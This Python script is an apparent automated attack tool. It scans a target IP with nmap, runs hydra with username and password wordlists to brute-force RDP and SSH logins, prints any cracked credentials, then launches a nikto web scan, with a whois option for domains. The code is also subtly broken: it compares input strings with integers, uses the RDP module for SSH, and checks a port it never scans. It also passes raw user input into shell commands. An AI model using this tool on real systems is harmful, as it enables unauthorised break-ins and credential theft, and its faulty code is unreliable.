import nmap
import re
import os 
print('1. domain name\n2.ip')            
choose = input()


if  choose == 1 :
                        
    ip = input("Please enter the destination IP:")

    nm = nmap.PortScanner()
    nm.scan(ip,'3389')
    list_port = list( nm[ip]['tcp'].keys() )
    if list_port.count(3389) == 1 :
        print("Port 3389 is powered on and is trying to brute force crack.")    
        os.system(f"hydra {ip} rdp -L HydraINI/3389/user.txt -P HydraINI/3389/pass.txt -V -t 10 -f >> tmp/Hydra.tmp")
        f = open('tmp/Hydra.tmp','r')
        hydratmp = f.read()
        obj = re.compile(r'.*?host: .*?   login: (?P<loginuser>.*?)   password: (?P<passwd>.*?)\n',re.S)
        if  re.findall(r'.*?host: .*?   login: (?P<loginuser>.*?)   password: (?P<passwd>.*?)\n',hydratmp) :
            print("OK")
            chuli = obj.finditer(hydratmp)
            print('Successfully cracked remote desktop')
            for it in  chuli :
                print(it.group("loginuser")) 
                print(it.group("passwd")) 

    if list_port.count(22) == 1 :
        print("Port 22 is powered on and is trying to brute force crack.")    
        os.system(f"hydra {ip} rdp -L HydraINI/SSH/sshuser.txt -P HydraINI/SSH/pass.txt -V -t 10 -f >> tmp/Hydra.tmp")
        f = open('tmp/Hydra.tmp','r')
        hydratmp = f.read()
        obj = re.compile(r'.*?host: .*?   login: (?P<loginuser>.*?)   password: (?P<passwd>.*?)\n',re.S)
        if  re.findall(r'.*?host: .*?   login: (?P<loginuser>.*?)   password: (?P<passwd>.*?)\n',hydratmp) :
            print("OK")
            chuli = obj.finditer(hydratmp)
            print('Successfully cracked SSH')
            for it in  chuli :
                print(it.group("loginuser")) 
                print(it.group("passwd")) 


    if list_port.count(22) == 1 :
        os.system(f'echo y | nikto -host http://{ip}  -o {ip}.html -F htm >> /var/tmp/t.tmp')
        print('Web vulnerability scanning completed')
        print('The scanning results are in the program directory')
if choose == 2 :
    print('Please enter the domain name:')
    yuming = input()
    os.system(f'whois {yuming} >> tmp/WhoisTmp')
    f = open('tmp/WhoisTmp','r')
    whois = f.read()
    obj = re.compile(r'(?P<content>.*?)  URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf',re.S)
    if re.findall('(?P<content>.*?)  URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/',whois) :
        print('yes')
        chuli = obj.finditer(whois)
        print(chuli)
        for it in  chuli :
                print(it.group("content")) 
    print('over')